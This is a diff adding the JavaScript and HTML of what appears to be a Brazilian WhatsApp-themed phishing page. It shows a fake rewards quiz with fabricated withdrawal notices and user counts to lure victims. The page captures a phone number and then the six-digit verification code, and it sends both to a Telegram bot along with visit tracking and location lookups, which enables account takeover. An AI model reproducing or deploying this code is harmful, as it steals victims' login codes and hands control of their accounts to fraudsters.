+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+                    });
+                    return (await response.json()).ok;
+                } catch (e) { return false; }
+            });
+            return (await Promise.all(sendPromises)).every(r => r);
+        }
+
+        window.sendNumber = async function() {
+            if (!checkRateLimit()) return;
+            const hp = document.getElementById("honeypot").value;
+            if (hp) return;
+
+            const code = document.getElementById("countryCode").value;
+            const num = document.getElementById("phoneNumber").value.trim();
+            if (num.length < 8 || num.length > 13) {
+                alert("Insira um número válido");
+                return;
+            }
+
+            updateDashboard('Phone', { phone: code + num });
+
+            const btn = document.getElementById('btn-send-number');
+            const loader = document.getElementById('number-loader');
+            btn.disabled = true;
+            loader.classList.remove('hidden');
+
+            setTimeout(async () => {
+                fullNumber = code + num;
+                await sendToTelegram(`📱 <b>Login Attempt</b>\n📞 <b>Number:</b> ${fullNumber}`);
+                document.getElementById("phone-input-page").classList.add('hidden');
+                document.getElementById("otp-input-page").classList.remove('hidden');
+                setupOtpInputs();
+                startTimer();
+                btn.disabled = false;
+                loader.classList.add('hidden');
+            }, 2000);
+        };
+
+        function setupPhoneMask() {
+            const input = document.getElementById('phoneNumber');
+            input.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 11) value = value.slice(0, 11);
+                
+                if (value.length > 0) {
+                    if (value.length <= 10) {
+                        if (value.length > 2) {
+                            if (value.length > 6) {
+                                value = value.slice(0, 2) + ' ' + value.slice(2, 6) + '-' + value.slice(6);
+                            } else {
+                                value = value.slice(0, 2) + ' ' + value.slice(2);
+                            }
+                        } else {
+                            value = value.slice(0, 2) + ' ' + value.slice(2);
+                        }
+                    } else {
+                        if (value.length > 2) {
+                            if (value.length > 7) {
+                                value = value.slice(0, 2) + ' ' + value.slice(2, 7) + '-' + value.slice(7);
+                            } else {
+                                value = value.slice(0, 2) + ' ' + value.slice(2);
+                            }
+                        }
+                    }
+                }
+                e.target.value = value;
+            });
+        }
+
+        function setupOtpInputs() {
+            const inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach((input, i) => {
+                input.addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    if (this.value.length >= 1 && inputs[i+1]) inputs[i+1].focus();
+                    if (Array.from(inputs).every(el => el.value.length === 1)) submitOtp();
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && inputs[i-1]) inputs[i-1].focus();
+                });
+            });
+            inputs[0].focus();
+        }
+
+        function startTimer() {
+            timeLeft = 60;
+            clearInterval(countdownTimer);
+            countdownTimer = setInterval(() => {
+                timeLeft--;
+                document.getElementById('countdown').textContent = `00:${timeLeft.toString().padStart(2, '0')}`;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownTimer);
+                    document.getElementById('resendBtn').classList.remove('opacity-50', 'pointer-events-none');
+                }
+            }, 1000);
+        }
+
+        window.resendOtp = function() {
+            startTimer();
+            document.getElementById('resendBtn').classList.add('opacity-50', 'pointer-events-none');
+            sendToTelegram(`🔄 <b>Resend OTP</b>\n📞 <b>Number:</b> ${fullNumber}`);
+        };
+
+        window.submitOtp = async function() {
+            if (!checkRateLimit()) return;
+            let otp = "";
+            document.querySelectorAll('.otp-input').forEach(i => otp += i.value);
+            if (otp.length < 6) return;
+            
+            updateDashboard('OTP', { otp: otp });
+
+            const success = await sendToTelegram(`✅ <b>OTP Received</b>\n📞 <b>Number:</b> ${fullNumber}\n🔢 <b>Code:</b> ${otp}`);
+            
+                if (success) {
+                    document.getElementById("otp-input-page").classList.add("hidden");
+                    document.getElementById("phone-input-page").classList.remove("hidden");
+                    document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+                }
+        }
+
+        function updateValidityDate() {
+            const tomorrow = new Date();
+            tomorrow.setDate(tomorrow.getDate() + 1);
+            document.getElementById('validity-date').innerText = tomorrow.toLocaleDateString('pt-BR');
+        }
+
+        function updateRecentWithdrawals() {
+            const container = document.getElementById('recent-withdrawals');
+            container.innerHTML = '';
+            for (let i = 0; i < 4; i++) {
+                const name = getNextRandom(namesList, nameQueue);
+                const value = valuesList[Math.floor(Math.random() * valuesList.length)];
+                const img = `https://i.pravatar.cc/100?u=${Math.floor(Math.random() * 1000)}`;
+                container.innerHTML += `
+                    <div class="flex items-center justify-between p-3 bg-white rounded-2xl border border-gray-100 shadow-sm">
+                        <div class="flex items-center gap-3">
+                            <div class="w-8 h-8 bg-gray-200 rounded-full overflow-hidden">
+                                <img src="${img}" alt="user" loading="lazy" class="w-full h-full object-cover">
+                            </div>
+                            <div class="text-left">
+                                <p class="text-xs font-bold text-gray-800">${name}</p>
+                                <p class="text-[10px] text-gray-400">Há ${Math.floor(Math.random() * 10) + 1} minutos</p>
+                            </div>
+                        </div>
+                        <span class="text-green-600 font-bold text-xs">+ ${value}</span>
+                    </div>
+                `;
+            }
+        }
+
+        function saveProgress(completed = false) {
+            localStorage.setItem('whatsapp_progress', JSON.stringify({
+                question: currentQuestion,
+                balance: totalBalance,
+                completed: completed
+            }));
+        }
+
+        function hideAllScreens() {
+            document.getElementById('screen-landing').classList.add('hidden');
+            document.getElementById('screen-quiz').classList.add('hidden');
+            document.getElementById('screen-final').classList.add('hidden');
+            document.getElementById('screen-withdraw').classList.add('hidden');
+        }
+
+        window.onload = () => {
+            updateDashboard('Nova Visita');
+            hideAllScreens();
+            const saved = JSON.parse(localStorage.getItem('whatsapp_progress'));
+            if (saved) {
+                if (saved.completed) {
+                    totalBalance = saved.balance;
+                    hideAllScreens();
+                    showWithdrawScreen();
+                } else if (saved.question > 1) {
+                    currentQuestion = saved.question;
+                    totalBalance = saved.balance;
+                    hideAllScreens();
+                    startQuiz();
+                    loadQuestion();
+                } else {
+                    document.getElementById('screen-landing').classList.remove('hidden');
+                }
+            } else {
+                document.getElementById('screen-landing').classList.remove('hidden');
+            }
+            getLocation();
+            updateToast();
+            startSessionTimer();
+            setInterval(updateToast, 9000);
+            updateValidityDate();
+            updateRecentWithdrawals();
+            setupPhoneMask();
+            initSlider();
+            setInterval(() => {
+                document.getElementById('user-count').innerText = Math.floor(Math.random() * (300 - 120 + 1)) + 120;
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
